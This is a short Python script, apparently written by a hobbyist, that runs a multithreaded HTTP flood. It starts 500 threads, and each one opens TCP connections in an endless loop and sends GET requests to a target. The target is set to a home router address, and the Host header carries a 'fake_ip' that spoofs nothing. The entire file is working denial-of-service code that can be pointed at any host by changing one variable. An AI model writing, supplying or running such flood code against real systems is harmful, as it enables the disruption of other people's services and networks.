# python uses simulated multi-threading to it isnt really the best language for this but ye it still works
import threading
import socket
# example ddos'ing my own router
target = '192.168.1.1'
port = 80
fake_ip = '122.21.20.22'

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # internet socket to tcp 
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if (already_connected % 500) == 0:
            print(f"sent {already_connected} packets to {target} through port {port}")

for i in range(500): # im using 500 threads
    thread = threading.Thread(target=attack)
    thread.start()

